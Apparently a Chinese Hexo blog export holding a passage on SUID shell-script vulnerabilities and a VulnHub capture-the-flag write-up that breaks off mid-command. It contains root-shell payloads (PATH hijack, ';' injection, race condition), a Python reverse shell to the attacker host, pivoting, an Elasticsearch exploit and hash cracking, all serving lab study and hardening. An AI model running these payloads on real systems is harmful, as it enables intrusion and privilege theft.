change-pass</span><br></pre></td></tr></table></figure>\n\n<p>此处重设置了TERM变量,而当C-shell脚本在运行时,便执行了TERM中的命令,从而导致漏洞发生</p>\n<h4 id=\"2-记住手动设置PATH-并且使用绝对路径\"><a href=\"#2-记住手动设置PATH-并且使用绝对路径\" class=\"headerlink\" title=\"2.记住手动设置PATH,并且使用绝对路径\"></a>2.记住手动设置PATH,并且使用绝对路径</h4><p>在上文中的<code>passwd $user</code>命令中,passwd使用了相对路径,从而导致漏洞发生.</p>\n<p>在正常情况下,系统会去搜索PATH路径下的passwd,然后执行/usr/bin/passwd文件</p>\n<p>但是如果攻击者将PATH设置为当前路径,并且创建一个恶意shell脚本,那么就会导致漏洞发生</p>\n<p>payload:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">% <span class=\"built_in\">export</span> PATH=<span class=\"string\">&#x27;/tmp&#x27;</span></span><br><span class=\"line\">% <span class=\"built_in\">echo</span> <span class=\"string\">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh&quot;</span> &gt;/tmp/passwd</span><br><span class=\"line\">% ./change-pass</span><br></pre></td></tr></table></figure>\n\n<p>更改后的脚本如下:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>另一个例子有一个C文件调用了system()函数,<code>system(&quot;mail&quot;)</code></p>\n<p>攻击者可以通过修改PATH,然后创建相应文件进行攻击</p>\n<h4 id=\"3-设置LD-LIBRARY-PATH\"><a href=\"#3-设置LD-LIBRARY-PATH\" class=\"headerlink\" title=\"3.设置LD_LIBRARY_PATH\"></a>3.设置LD_LIBRARY_PATH</h4><p>当linux中,除非在编译时加上static选项,否则都会默认调用动态链接库<code>ld.so/ld-linux.so</code></p>\n<p>可以使用<code>ldd FILE</code>查看所依赖的库</p>\n<p>当程序运行时会在LD_LIBRARY_PATH变量中查找所需动态库的地址,如果攻击者将此环境变量重置,从而将动态链接库替换为恶意代码,那么就会导致恶意代码执行</p>\n<p>解决方法:</p>\n<p>1.在程序中设置此环境变量</p>\n<p>2.在编译时静态连接</p>\n<h4 id=\"4-设置LD-PRELOAD变量\"><a href=\"#4-设置LD-PRELOAD变量\" class=\"headerlink\" title=\"4.设置LD_PRELOAD变量\"></a>4.设置LD_PRELOAD变量</h4><p>与3类似,当程序在运行前,会先链接此变量中的动态链接库,如果攻击者修改为自己的恶意链接库,则造成危害</p>\n<p>举个例子:</p>\n<p><code>export LD_PRELOAD=./libmylib.so</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//a.c    C代码</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">sleep</span> <span class=\"params\">(<span class=\"keyword\">int</span> s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;I am not sleeping!\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -fPIC -g -c a.c</span><br><span class=\"line\">gcc -shared -o libmylib.so a.o -lc</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//被攻击程序</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行如上程序,则可以通过SUID执行恶意代码</p>\n<h4 id=\"5-了解程序是怎么运作的\"><a href=\"#5-了解程序是怎么运作的\" class=\"headerlink\" title=\"5.了解程序是怎么运作的\"></a>5.了解程序是怎么运作的</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">rm /tmp/.user</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> &gt; /tmp/.user</span><br><span class=\"line\">isroot=<span class=\"string\">&#x27;/usr/bin/grep -c root /tmp/.user&#x27;</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$isroot</span>&quot;</span> -gt 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;You Can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>承接上文,如果此程序可以用来更改root的密码,那岂不是犯了大错,所以在程序中加入了用户检测,看看是不是root.如果是,那么就退出程序</p>\n<p>你以为这样就万事大吉了吗?不,还有许多问题.</p>\n<p>思考一个问题,如果用户输入为空,即单纯运行此脚本,那么是否会正常执行passwd命令?</p>\n<p>要记住,当passwd输入为空时,默认更改的账号是执行者的账号.又由于suid的设置,即会更改root的密码.也就是说,前面的检测不完全.</p>\n<p>新文件:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">rm /tmp/.user</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> &gt; /tmp/.user</span><br><span class=\"line\">isroot=<span class=\"string\">&#x27;/usr/bin/grep -c root /tmp/.user&#x27;</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$isroot</span>&quot;</span> -gt 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;You Can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到,在这里添加了检测输入是否为空,如果为空即退出.</p>\n<h5 id=\"所以-一定要理解程序是怎么运行的-特别关注各种参数带来的不同影响\"><a href=\"#所以-一定要理解程序是怎么运行的-特别关注各种参数带来的不同影响\" class=\"headerlink\" title=\"所以,一定要理解程序是怎么运行的,特别关注各种参数带来的不同影响.\"></a>所以,一定要理解程序是怎么运行的,特别关注各种参数带来的不同影响.</h5><h4 id=\"6-除非必要-不要使用临时文件-就算要使用也不要放在公共可读写区域\"><a href=\"#6-除非必要-不要使用临时文件-就算要使用也不要放在公共可读写区域\" class=\"headerlink\" title=\"6.除非必要,不要使用临时文件.就算要使用也不要放在公共可读写区域.\"></a>6.除非必要,不要使用临时文件.就算要使用也不要放在公共可读写区域.</h4><p>当攻击者在脚本删除文件的一瞬间后,又创建了一个.user文件,内部为空.那么这个时候会被覆盖吗?也许会,但也许也不会,这要看文件权限是怎么设置的.但是一旦没有覆盖,攻击者就绕过了用户名检测,就可以更改root的密码了.</p>\n<h4 id=\"7-检查所有输入-去除元字符\"><a href=\"#7-检查所有输入-去除元字符\" class=\"headerlink\" title=\"7.检查所有输入,去除元字符\"></a>7.检查所有输入,去除元字符</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$1</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> = root ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>​    在新脚本中,我们不再使用临时文件,转而直接检测.但却没有对用户输入进行更深的检测,这就有可能导致漏洞的发生</p>\n<p>payload: <code>./change-pass &quot;user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</code></p>\n<p>可以看到,在此处运用了<code>;</code>进行分割,当程序执行完passwd命令后,又会以root身份执行其他命令,这无异是一个很大的问题.</p>\n<p>新脚本:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$&#123;1##*[ \\\\$/;()|\\&gt;\\&lt;&amp; ]&#125;</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> = root ] &amp;&amp; <span class=\"string\">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<p>在此处,我们对用户的输入进行过滤,去除元字符,从而保障语句执行的正确性.</p>\n<h4 id=\"8-记得设置IFS\"><a href=\"#8-记得设置IFS\" class=\"headerlink\" title=\"8.记得设置IFS\"></a>8.记得设置IFS</h4><p>IFS,一个环境变量,Internal Field Separator,即内部字段分隔符.在这里,如果提前设置</p>\n<p><code>export IFS=&#39;/&#39;</code>那么当程序执行<code>/usr/bin/passwd</code>时,就会执行<code>usr</code>、<code>bin</code>、<code>passwd</code>三个命令,从而造成危险</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/ksh</span></span><br><span class=\"line\">PATH=<span class=\"string\">&#x27;/bin:/usr/bin&#x27;</span></span><br><span class=\"line\">IFS=<span class=\"string\">&#x27; &#x27;</span></span><br><span class=\"line\">user=<span class=\"variable\">$&#123;1##*[ \\\\$/;()|\\&gt;\\&lt;&amp; ]&#125;</span></span><br><span class=\"line\">[ -z <span class=\"variable\">$user</span> ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">[ <span class=\"string\">&quot;<span class=\"variable\">$user</span>&quot;</span> = root ] &amp;&amp; <span class=\"string\">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class=\"built_in\">exit</span></span><br><span class=\"line\">/usr/bin/passwd <span class=\"variable\">$user</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"9-不可避免的危险——固有条件竞争\"><a href=\"#9-不可避免的危险——固有条件竞争\" class=\"headerlink\" title=\"9.不可避免的危险——固有条件竞争\"></a>9.不可避免的危险——固有条件竞争</h4><p>程序在执行suid脚本时分为两步</p>\n<p>1.系统打开一个新shell</p>\n<p>2.新shell读取脚本的内容并执行.</p>\n<p>如果时间点卡得刚刚好,那么攻击者可以先创建一个链接,在执行改链接文件的瞬间替换它的内容,从而实现通过SUID所有者权限执行任意内容</p>\n<p>payload:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./rootme &amp; rm rootme &amp;&amp; \\</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span> \\</span><br><span class=\"line\"> &gt;&gt; rootme</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复:\"></a>修复:</h3><h4 id=\"尽量少调用外部函数\"><a href=\"#尽量少调用外部函数\" class=\"headerlink\" title=\"尽量少调用外部函数\"></a>尽量少调用外部函数</h4><h4 id=\"最小特权原则\"><a href=\"#最小特权原则\" class=\"headerlink\" title=\"最小特权原则\"></a>最小特权原则</h4><h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf\">EN - SUID Privileged Programs.pdf</a></p>\n<p><a href=\"http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf\">EN - Dangers of SUID Shell Scripts.pdf</a></p>\n"},{"title":"一起来打靶-第一周","date":"2021-08-04T09:33:00.000Z","_content":"# 一起来打靶~~Write-Up\n\n## \t第一周\n\n​\t**靶机链接**:http://www.vulnhub.com/entry/boredhackerblog-social-network,454/\n\n​\t**难度**:*Medium*\n\n​\t**攻击机**:Kali Linux\n\n​\t**所用工具**:[dirsearch](https://github.com/maurosoria/dirsearch)、[Venom](https://github.com/Dliv3/Venom)\n\n\n\n\n\n### \t\t\t\t主机发现\t\n\n​\t我们在内网部署了Virtualbox虚拟机靶场,既然在一个局域网内,不妨使用二层的主机发现方式——ARP\n\n​\t使用命令`sudo arp-scan -l` 扫描当前局域网内的存活主机\n\n​\t如果当前主机存在多网卡现象,可使用参数`-I <interface>`指定要扫描的局域网的网卡\n\n![截屏2021-08-04 下午12.35.27](https://tva1.sinaimg.cn/large/008i3skNly1gt4nfuz98uj31400d878h.jpg)\n\n#### \t虚拟机在哪?!!\n\n​\t\t很快结果出现了,局域网内有这么多设备!\n\n​\t\t怎么识别哪个是靶场虚拟机,哪个是真实的局域网设备呢?\n\n​\t\t别慌,对于每一张真实主机的网卡都会有一个相对应的mac地址\n\n​\t\t通常来说,mac地址是主机在二层网络中的唯一识别码,是由网卡生产商在出厂时烧录在网卡中的\n\n​\t\t但是对于虚拟机来说,它可没有真实的网卡,是由虚拟机创造的虚拟网卡!\n\n​\t\t因此,我们可以通过mac地址的前三格判断是否为虚拟机\n\n> \"00:05:69\"; //vmware1\n>\n> \"00:0C:29\"; //vmware2\n>\n> \"00:50:56\"; //vmware3\n>\n> \"00:1c:14\"; //vmware4\n>\n> \"00:1C:42\"; //parallels1\n>\n> \"00:03:FF\"; //microsoft virtual pc\n>\n> \"00:0F:4B\"; //virtual iron 4\n>\n> \"00:16:3E\"; //red hat xen , oracle vm , xen source, novell xen\n>\n> \"08:00:27\"; //virtualbox\n\n​\t\t原文链接：https://blog.csdn.net/weixin_43418664/article/details/83759238\n\n​\t\t\t很明显,*10.0.0.16*的mac地址*08:00:27:35:5d:bc*是vritualbox的虚拟网卡,看来我们确定了目标\n\n### 扫描\n\n现在知道了靶机的ip-10.0.0.16,我们还需要知道开放了哪些**端口**、运行哪些**服务**\n\n我们使用大名鼎鼎的扫描工具**nmap**进行扫描\n\n#### 端口扫描\n\n​\t`sudo nmap -p- 10.0.0.16`\n\n​\t为什么要使用sudo呢?在默认情况下,如果执行时的权限为普通用户会进行正常的端口扫描,而在root权限下则默认使用TCP SYN扫描(参数`-sS`),这样扫描**更隐蔽**,不容易被防火墙检测.\n\n​\t使用`-p-`参数进行**全端口扫描**,因为nmap默认只扫描最常见的1000个端口,为了防止错过端口,就使用全端口扫描吧!![截屏2021-08-04 下午12.52.46](https://tva1.sinaimg.cn/large/008i3skNly1gt4nxu0w3oj30t00bewgk.jpg)\n\n由于在本地网络,扫描很快就以迅雷不及掩耳之势完成了.可以发现靶机打开了两个端口,22和5000\n\n#### 服务扫描\n\n知道了端口,我们还要知道在端口上面运行了什么服务,以及服务是什么版本的.\n\n`sudo nmap -p22,5000 -sV 10.0.0.16`使用命令扫描22和5000端口,并使用`-sV`扫描服务的版本\n\n![截屏2021-08-04 下午12.56.42](https://tva1.sinaimg.cn/large/008i3skNly1gt4o25ye6sj315y0ckgpf.jpg)\n\n看来22端口运行着**OpenSSH**服务,版本为6.6.p1,而且我们惊喜的得知了**操作系统**为Ubuntu~\n\n5000端口运行着**http**服务,也就是所谓的**web**服务,值得注意的是此处使用的版本为**Werkzeug** httpd 0.14.1\n\nWerkzeug是一个WSGI**工具包**,是Web框架的底层库,属于**python**的一个模块,仔细观察扫描结果,我们可以发现靶机运行着Python2.7.15的环境,这也许意味着我们后期可以通过**python脚本进行反弹shell**等工作.\n\n### Web页面\n\n#### 常规测试?\n\n既然5000端口运行着http服务,那我们就去看一看吧\n\n在浏览器输入10.0.0.16:5000打开web页面\n\n![截屏2021-08-04 下午1.03.20](https://tva1.sinaimg.cn/large/008i3skNly1gt4o8u5o0aj31dt0u0gri.jpg)\n\n对首页进行分析,只有一个输入框可以进行**数据输入**\n\n面对**留言**功能,最容易发生的就是**sql注入**和**XSS**,我们进行尝试\n\n![截屏2021-08-04 下午1.06.09](https://tva1.sinaimg.cn/large/008i3skNly1gt4obrhq13j30p60h0gnf.jpg)\n\n进行简单的测试后,我们发现XSS与sql注入似乎都失败了\n\n我们好像遇到了一个瓶颈,现有的功能都测试过了,但是都没有用......\n\n#### 信息收集的魅力~\n\n对于一个web网站,我们可以从已知的方面入手,就像刚才一样测试,但是进攻的方式还有很多,我们不妨再找一条路?\n\n**目录扫描!!!**\n\n既然当前的首页我们找不到漏洞,不如找找其他页面?\n\n目录扫描的工具有很多,此处使用由python编写的工具**dirsearch**\n\n`dirsearch -u \"http://10.0.0.16:5000/\"`\n\n![截屏2021-08-04 下午1.16.05](https://tva1.sinaimg.cn/large/008i3skNly1gt4om70jnlj315w0h0770.jpg)\n\n很顺利,我们发现了admin文件\n\n对于web应用来说,**寻找敏感目录**是**非常重要**的一步,一定要记住!\n\n![截屏2021-08-04 下午1.19.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4opmo68xj31a40qg0u9.jpg)\n\n此处具有执行代码的功能,奇怪,什么代码???\n\n我们先尝试shell指令\n\n`echo \"hello world\"`\n\n![截屏2021-08-04 下午1.21.02](https://tva1.sinaimg.cn/large/008i3skNly1gt4or90styj30na0cmdgu.jpg)\n\n居然显示代码执行出错?\n\n看来不是shell指令,那么会是什么呢?\n\n回顾我们之前nmap扫描的结果,这个web使用的是python中的模块搭建的,会不会执行的是python的代码呢?\n\n我们尝试输入python代码\n\n```python\ndef HH():\n\tprint('HH')\nHH()\n```\n\n![截屏2021-08-04 下午1.24.13](https://tva1.sinaimg.cn/large/008i3skNly1gt4oujiau2j30na0cmq3n.jpg)\n\n代码运行成功了!\n\n**在进行渗透测试时,一定要学会充分的信息收集,并将所收集到的信息运用到其他地方的测试~**\n\n下一步,我们尝试通过执行python代码反弹shell\n\n先在本地通过`nc -lp 4444`监听4444端口,再在web端执行如下代码\n\n```python\nimport socket,os,subprocess\nRHOST='10.0.0.12'  # Change it\nRPORT=4444  # Change it\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # 创建一个TCP-socket对象\ns.connect((RHOST,RPORT)) \t# 连接攻击者\nos.dup2(s.fileno(),0)\t\t# 复制链接符\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([\"/bin/sh\",\"-i\"])  # 创建子进程调用SHELL\n```\n\n成功获取Shell\n\n我们好幸运啊!!!直接获得了root账户......吗?\n\n![截屏2021-08-04 下午1.38.39](https://tva1.sinaimg.cn/large/008i3skNly1gt4p9l2y4zj31ju0t2qdp.jpg)\n\n`ls`查看当前目录,发现了Dockerfile\n\n### 危\n\nDocker是一种标准化部署环境的工具,可以勉强理解为虚拟机\n\n我们怎么验证我们是否被困在docker环境内呢\n\n1.查看根目录下是否存在.dockerenv文件夹\n\n`ls /.dockerenv`存在!\n\n 2.查看/proc/1/cgroup文件\n\n`cat /proc/1/cgroup` \n\n/proc是一个存储进程的文件夹,linux中万物皆为文件,包括进程!\n\n/proc/1指的是操作系统加载时的第一个进程,我们查看后居然发现了Docker!,并且可以获得docker镜像的hash.\n\n这下可咋整!本以为得到了root权限,结果却在docker容器中??!真是白高兴一场...\n\n### 山重水复疑无路、柳暗花明又一村~\n\n虽然这只是个docker,但我们也不放做一些信息收集\n\n\n\n![截屏2021-08-04 下午2.34.53](https://tva1.sinaimg.cn/large/008i3skNly1gt4qw3hnk5j30w40gctd8.jpg)\n\n发现了**内网环境**,而且这个内网还挺大!\n\n怎么对内网的环境进行扫描呢?\n\n我们不妨使用Shell执行一下本地自动化的ping探测\n\n`for i in $(seq 254);do ping -c 1 172.17.0.$i;done`\n\nPs:其实应该扫描CIDR为16的内网范围,但是范围太大了,就偷个小懒\n\n扫描后发现只有172.17.0.1、172.17.0.2、172.17.0.3是可以ping通的\n\n#### 代理\n\n没错!就是代理\n\n我们通过在这台docker上设置代理,以此为跳板,将攻击机发出的数据通过这台docker进行中转,最终发到内网中!\n\n同样,内网代理的工具有很多,我们这里使用Venom进行代理\n\n怎么将代理程序传到靶机上呢?\n\n我们在本地通过python启动**http服务**(ip:10.0.0.12),在靶机上使用**wget**下载文件\n\n![截屏2021-08-04 下午2.45.15](https://tva1.sinaimg.cn/large/008i3skNly1gt4r6v5im8j319g09c76d.jpg)\n\n![截屏2021-08-04 下午2.48.05](https://tva1.sinaimg.cn/large/008i3skNly1gt4r9skm5tj310s07o75p.jpg)\n\n之后使用Venom在攻击机运行管理端,设置`-lport 8111`即监听端口8111![截屏2021-08-04 下午2.51.22](https://tva1.sinaimg.cn/large/008i3skNly1gt4rd78avdj30lg0dg0ug.jpg)\n\n![截屏2021-08-04 下午2.52.01](https://tva1.sinaimg.cn/large/008i3skNly1gt4rdvohquj30su0mu0wm.jpg)\n\n在靶机上赋予代理端程序可执行权限,运行程序连接管理端\n\n成功链接\n\n![截屏2021-08-04 下午2.53.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4rfm4eoij30x409umyx.jpg)\n\n使用`show`显示当前代理节点,使用`goto 1`进入刚才连接的靶机节点\n\n使用`socks 3388`在本地3388端口打开一个socks5的代理通道,可以通过此代理与靶机的内网环境进行数据传输\n\n创建好代理后,我们通过proxychains这个软件连接代理\n\n首先通过`sudo vi /etc/proxychains4.conf `修改proxychains的配置文件\n\n![截屏2021-08-04 下午2.56.33](https://tva1.sinaimg.cn/large/008i3skNly1gt4rilwft3j30e806e0t8.jpg)\n\n将tor的代理在行首添加`#`注释掉,在末尾添加`socks5 127.0.0.1 3388`设置代理\n\n到此,代理的设置就完毕啦!\n\n#### 鬼子进村~\n\n有了代理后,我们就可以对内网环境进行扫描了\n\n在要执行的命令前加上`proxychains`使用代理环境\n\n`proxychains nmap 172.17.0.1-3`\n\n![截屏2021-08-04 下午3.41.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4stcu36hj30e80gwdi0.jpg)\n\n对于新出现的端口9200,似乎很有意思,我们扫描一下\n\n`proxychains nmap -sV -p 9200 172.17.0.2`\n\n\n\n![截屏2021-08-04 下午3.43.11](https://tva1.sinaimg.cn/large/008i3skNly1gt4sv4faelj31f602mgmc.jpg)\n\n神奇的软件出现了,Elasticsearch是一个web应用,历史漏洞很多.\n\n找到了一个应用,那我们就来找找看有没有漏洞吧~\n\n只不过这一次不一样,我们不用自己找,而是来搜索一下以前的大佬们对此软件有没有相应的payloads\n\n使用`searchsploit Elasticsearch `搜索exploit-db漏洞数据库\n\n​\t\t\tPs:[exploit-db](https://www.exploit-db.com/)是一个大型的漏洞数据库网站,里面有大量已知漏洞的信息以及利用exp,建议各位去浏览学习,**searchsploit**是其便于搜索的工具\n\n![截屏2021-08-04 下午3.51.48](https://tva1.sinaimg.cn/large/008i3skNly1gt4t43gztzj31i80d6wjb.jpg)\n\n左侧是漏洞的描述信息,右侧是存储的路径\n\n由于我们使用的是kali Linux,自动安装searchsploit,漏洞存储在/usr/share/exploitdb/exploits/中\n\n所以我们使用`cp /usr/share/exploitdb/exploits/linux/remote/36337.py .`\n\n拷贝exp到当前目录![截屏2021-08-04 下午3.56.58](https://tva1.sinaimg.cn/large/008i3skNly1gt4t9igj4uj310r0u00yk.jpg)\n\n成功~\n\n执行ls命令,发现有一个好玩的东西,passwords文件!\n\n我们来康康有什么!~![截屏2021-08-04 下午3.58.03](https://tva1.sinaimg.cn/large/008i3skNly1gt4tam27dbj31fs09cmzv.jpg)\n\n哦~好多账号和密码,可惜是md5加密后的\n\n我们在网上搜索md5在线解密,获得密码的原文\n\n或者,文件提示密码格式为4个数字加四个小写字母\n\n我们可以使用hashcat进行破解~\n\n`ashcat -m 0 -a 3 3f8184a7343664553fcb5337a3138814 ?d?d?d?d?l?l?l?l --force`\n\n获取到用户名与密码后,我们来看看有什么用吧~\n\n注意到前文的端口扫描,发现有22ssh服务开启,我们尝试登陆\n\n经过尝试后,发现只有john账户才可以登录,使用命令`proxychains ssh john@172.17.0.1`进行登录~\n\n![截屏2021-08-04 下午4.21.40](https://tva1.sinaimg.cn/large/008i3skNly1gt4tz7gxlij31fs082tat.jpg)\n\n登录账户后,日常看一看账户信息,很可惜的是没有sudo权限,不然我们已经拥有密码,可以直接拥有root权限\n\n在使用`uname -a`查看内核信息时出现了惊喜,3.13.0的内核?!现在的内核已经到了5.x\n\n这么老的内核可能会有漏洞\n\n我们再一次使用`searchsploit Linux Kernel 3.13.0`搜索漏洞,搜到一堆漏洞,但大多数都是.c结尾的c文件,需要编译后才可使用\n\n#### 没有gcc??!!\n\n通过`wget http://10.0.0.12/exp.c`获得exp后,尝试使用gcc进行编译\n\n**居然没有gcc?!**\n\n这可就麻烦了,没有编译软件,怎么生成可执行二进制文件呢?\n\n思索过后,我决定在本地将exp进行编译\n\n尝试过后,我发现因为环境不一样,大部分exp在本地是无法编译的,\n\n有一个exp可以在本地编译,但是其中代码中有调用了gcc\n\n![截屏2021-08-04 下午4.46.37](https://tva1.sinaimg.cn/large/008i3skNly1gt4up4ul4qj31140o8gp8.jpg)\n\n### 那怎么办呢?改呗!\n\n分析此处逻辑,其实就是调用了gcc生成一个动态链接库进行使用\n\n那我们干脆在本地把动态链接库也准备好!\n\n把此处相关代码进行注释,重新编译\n\n寻找文件名为`ofs-lib.so`的动态链接库,我们使用`locate ofs-lib.so`对文件进行定位\n\n![截屏2021-08-04 下午4.49.48](https://tva1.sinaimg.cn/large/008i3skNly1gt4usg3xenj311405g0u5.jpg)\n\n哈哈,找到啦~\n\n我们开启`python3 -m http.server 